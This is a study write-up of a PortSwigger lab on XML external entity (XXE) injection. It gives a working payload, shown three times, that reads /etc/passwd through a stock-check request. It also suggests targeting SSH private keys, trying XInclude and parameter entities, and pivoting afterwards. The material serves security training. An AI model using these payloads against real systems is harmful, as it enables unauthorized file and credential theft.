# üìö **Lab: Exploiting XXE using external entities to retrieve files**

**Lab URL:** [Exploiting XXE Lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

---

## üöÄ **High-Level Summary of the Lab**

- **_Objective:_** Exploit an **_XXE (XML External Entity)_** vulnerability to retrieve sensitive files from the server.
    
- **_Vulnerability Cause:_** Improper parsing of XML input without disabling external entity processing.
    
- **_Key Techniques:_**
    
    - Injection of a malicious external entity definition.
        
    - Referencing the defined entity to trigger the file retrieval.
        
- **_Learnings:_**
    
    - Understand how XXE vulnerabilities occur.
        
    - Learn how to test for and exploit XXE using **_Burp Suite_**.
        

---

## üìå **PortSwigger Solution:**

1. Visit a product page and click **_Check stock_**.
    
2. Intercept the resulting POST request using **_Burp Suite_**.
    
3. Modify the request with the following XML payload:
    

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

4. Send the request. The response will contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.
    

---

---
## üìå **Instructor Solution:**

1. Open **_Burp Suite_** and navigate to the product page.
    
2. Click **_Check stock_** and intercept the request.
    
3. Send the intercepted request to the **_Repeater_** (`Ctrl+R`).
    
4. Modify the XML payload:
    

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

5. Send the modified request.
    
6. Verify the response displaying `/etc/passwd` file content.
    
7. Additional testing ideas:
    
    - Attempt accessing sensitive SSH keys (e.g., `/home/user/.ssh/id_rsa`).
        
    - Explore different entity expansion methods (`XInclude`, parameter entities).
        

---

---

## üìå **Key Hints and Strategies from the Instructor:**

### Initial Approach and Functional Testing:

- Always start by understanding the application's functionality:
    
    - Can you log in?
        
    - Can you create accounts?
        
    - Can you add items to a basket?
        
- Identify the main functionality first.
    

### Traffic and Burp Suite Setup:

- Use Burp Suite to capture traffic and filter results for relevant requests.
    
- Focus on requests showing XML data or accepting XML input.
    

### XXE Testing Steps:

- If XML is present, always test for XML External Entity (XXE) vulnerabilities.
    
- If the application uses JSON, try switching the payload format to XML and test for XXE.
    
- Send the request to Repeater in Burp Suite for manual testing.
    

### Crafting the Payload:

- Use the basic structure for testing an XXE payload:
    

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- Always remember to reference the entity (`&xxe;`) somewhere within the XML request body.
    

### Payload Source:

- If unsure about payloads, refer to trusted sources:
    
    - PayloadsAllTheThings
        
    - HackTricks
        
    - Personal notes for reusable payloads.
        

### Expanding the Attack Surface:

- If one payload works, try other XXE techniques like:
    
    - XInclude
        
    - Parameter Entities
        
- Continue testing even after finding a vulnerability. Don't stop at the first discovery.
    

### Real-World vs. CTFs:

- In CTFs, sensitive files like `/home/user/.ssh/id_rsa` might be directly accessible.
    
- In real-world scenarios, services often run under restricted accounts (e.g., `www-data`).
    

### Post-Exploitation Mindset:

- Determine the full impact of the vulnerability:
    
    - Can you access sensitive data?
        
    - Can you escalate privileges or pivot further?
        
- Test the vulnerability in different areas of the application. Mistakes are often repeated in multiple endpoints.
    

### Reporting:

- When writing a report, ensure to capture:
    
    - The extent of the vulnerability.
        
    - Proof of exploitation.
        
    - Potential mitigation steps.
        


## üìñ **Why This Solution is an Example of XXE Attack:**

- **_Target:_** XML parsing that allows external entities.
    
- **_Exploitation:_** Injecting an external entity to reference sensitive files.
    
- **_Impact:_** Unauthorized file access, potentially leading to data disclosure.
    

---

## üè∑Ô∏è **Hashtags and Tags:**

`#WebSecurity #BurpSuite #XXE #PathTraversal #PenTesting`